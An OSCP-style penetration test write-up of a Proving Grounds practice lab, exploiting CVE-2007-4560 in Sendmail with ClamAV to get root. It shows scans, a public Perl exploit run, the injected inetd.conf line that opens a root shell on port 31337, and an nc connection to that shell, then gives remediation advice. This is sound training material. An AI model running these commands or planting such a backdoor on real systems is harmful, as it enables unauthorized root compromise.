# PG Practice ClamAV - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-8

---

## 0. Lesson Learned

Read the exploit output thoroughly.

---

## 1. Executive Summary

A penetration test was conducted against the target system 192.168.190.42.
The assessment identified a critical vulnerability in the Sendmail + ClamAV integration (CVE-2007-4560), allowing unauthenticated remote command execution.

This vulnerability was successfully exploited to obtain a root shell, resulting in full system compromise.

---

## 2. Scope

- **Target:** 192.168.190.42
- **Environment:** PG Practice ClamAV
- **Testing Window:** 2026-4-8
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was conducted.

Command:

```
nmap -p- -sC -sV 192.168.190.42 -T4 -oA clamav_tcp
```

Output:

```
22/tcp     open  ssh     OpenSSH 3.8.1p1 Debian
25/tcp     open  smtp    Sendmail 8.13.4
80/tcp     open  http    Apache httpd 1.3.33
139/tcp    open  netbios-ssn Samba
445/tcp    open  netbios-ssn Samba
199/tcp    open  smux
60000/tcp  open  ssh     OpenSSH 3.8.1p1
```

Interpretation:

Multiple outdated services were identified, notably Sendmail 8.13.4, which is known to be vulnerable.

---

## 5. Enumeration

### HTTP Enumeration

The web service on port 80 contained binary data.

Observation:

Binary decoded to:

```
ifyoudontpwnmeuran00b
```

Interpretation:

This appeared to be a hint rather than credentials.

### SMB Enumeration

Command:

```
smbclient -L //192.168.190.42 -N
```

Output:

```
Sharename       Type
---------       ----
print$          Disk
IPC$            IPC
ADMIN$          IPC
```

Interpretation:

SMB shares were accessible anonymously but did not provide immediate access for exploitation.

---

## 6. Initial Access

### Vulnerability Identification

The service Sendmail 8.13.4 is vulnerable when combined with ClamAV via:

- CVE-2007-4560
- Known public exploits available

### Exploit Used

A public exploit was leveraged:

```
perl black-hole.pl 192.168.190.42
```

Output:

```
Sendmail clamav-milter Remote Root Exploit
...
echo "31337 stream tcp nowait root /bin/sh -i" >> /etc/inetd.conf
```

Interpretation:

The exploit successfully injected a backdoor into inetd, opening a root shell on port 31337.

### Verification of Backdoor

Command:

```
nmap 192.168.190.42 -p 31337
```

Output:

```
31337/tcp open  Elite
```

Interpretation:

The backdoor service was successfully created and is listening.

---

## 7. Post-Exploitation

### Gaining Shell Access

Command:

```
nc 192.168.190.42 31337
```

Output

```
id
uid=0(root) gid=0(root)

whoami
root

hostname
0xbabe.local
```

Interpretation:

A root shell was obtained immediately upon connection.

---

## 8. Privilege Escalation

Not required.

Interpretation:

The exploit directly provided root-level access, bypassing the need for privilege escalation.

---

## 9. Proof of Compromise

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Unpatched Service Vulnerability Allowing Remote Code Execution

**Severity:** Critical

**Description:**
The system was running a vulnerable version of a network service (e.g., Sendmail with ClamAV integration) that allowed unauthenticated remote command execution.

**Impact:**
Attackers could execute arbitrary commands with elevated privileges, resulting in full system compromise.

**Recommendation:**
Upgrade affected services to patched versions, disable unnecessary services, and restrict access using network-level controls.

### **Finding:** Multiple Outdated Services

**Severity:** High

**Description:**
The system was running multiple outdated services (e.g., OpenSSH, Apache, Samba) with known vulnerabilities.

**Impact:**
Legacy services increase the attack surface and likelihood of exploitation by attackers.

**Recommendation:**
Upgrade all services to supported versions, apply regular patch management, and perform periodic vulnerability assessments.

### **Finding:** Unrestricted Exposure of Critical Network Services

**Severity:** Medium

**Description:**
Critical services (e.g., SMTP, SMB) were exposed externally without sufficient access restrictions.

**Impact:**
Attackers could interact with exposed services, increasing the risk of enumeration and remote exploitation.

**Recommendation:**
Restrict access to critical services using firewall rules, limit exposure to trusted networks, and disable unnecessary externally accessible services.

---

## 11. Appendix

Sendmail + ClamAV RCE Exploit -
[https://www.exploit-db.com/exploits/4761](https://www.exploit-db.com/exploits/4761)